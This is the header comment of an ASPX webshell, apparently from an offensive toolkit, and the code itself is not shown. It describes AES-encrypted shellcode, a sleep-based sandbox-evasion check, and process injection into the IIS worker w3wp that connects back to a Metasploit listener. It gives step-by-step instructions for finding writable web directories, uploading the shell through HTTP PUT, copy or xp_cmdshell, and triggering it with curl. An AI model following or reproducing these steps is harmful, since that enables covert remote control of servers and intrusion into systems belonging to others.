<%--
================================================================
ASPX_Inject64.aspx — ASPX Webshell: AES-Encrypted Remote Process Injector for IIS
================================================================
WHAT THIS DOES:
  An ASPX webshell that runs C# code inside IIS (ASP.NET). When the page
  is loaded by a browser or curl, it automatically:
    1. Sleeps 5 seconds (sandbox evasion — exits if sleep was skipped)
    2. Decrypts AES-encrypted shellcode at runtime
    3. Patches your LHOST/LPORT into the shellcode
    4. Finds a running process by name (default: w3wp — the IIS worker)
    5. Injects the shellcode into it using OpenProcess + VirtualAllocEx +
       WriteProcessMemory + CreateRemoteThread
  Connects back to your Metasploit listener.
...
BEFORE DEPLOYING — CHANGE THESE VALUES IN THE CODE BELOW:
  ...
  string TGT_PROC = "w3wp";         <- process to inject into (w3wp = IIS worker)

  Also change MyKey and Myiv to match the key used to encrypt your shellcode.
  Also replace buf[] with your own AES-encrypted shellcode (see below).

ALSO: Remove 'Debug="true"' from the Page directive (line below this comment)
  before deploying — debug mode leaks stack traces to users.
...
PREPARE YOUR SHELLCODE (on Kali):
  ...
  3. Copy the byte array from ./result/encryptedShellcodeWrapper_aes.cs
  4. Paste it into the buf[] array below
  5. Update MyKey and Myiv to match your encryption key/IV
...
STEP 2 — FIND A WRITABLE DIRECTORY ON THE IIS SERVER:
  icacls C:\inetpub\wwwroot
  icacls C:\inetpub\wwwroot\uploads

STEP 3 — UPLOAD TO IIS SERVER (choose one method):
  a) Via curl (if PUT is enabled):
       curl -X PUT http://target/ASPX_Inject64.aspx --data-binary @ASPX_Inject64.aspx
  b) Via existing shell or RDP:
       copy ASPX_Inject64.aspx C:\inetpub\wwwroot\
  c) Via MSSQL xp_cmdshell (if you have SQL access):
       EXEC xp_cmdshell 'echo "..." > C:\inetpub\wwwroot\inject.aspx'

STEP 4 — TRIGGER EXECUTION:
  curl http://<TARGET_IP>/ASPX_Inject64.aspx
  OR browse to it in a browser — the code runs on page load automatically.

NOTES:
  - w3wp.exe (IIS worker) is always running when IIS is up — good injection target
  - The AES key/IV are hardcoded here — change them from the public defaults
  - Remove Debug="true" from the <%@ Page %> directive before use
================================================================
--%>
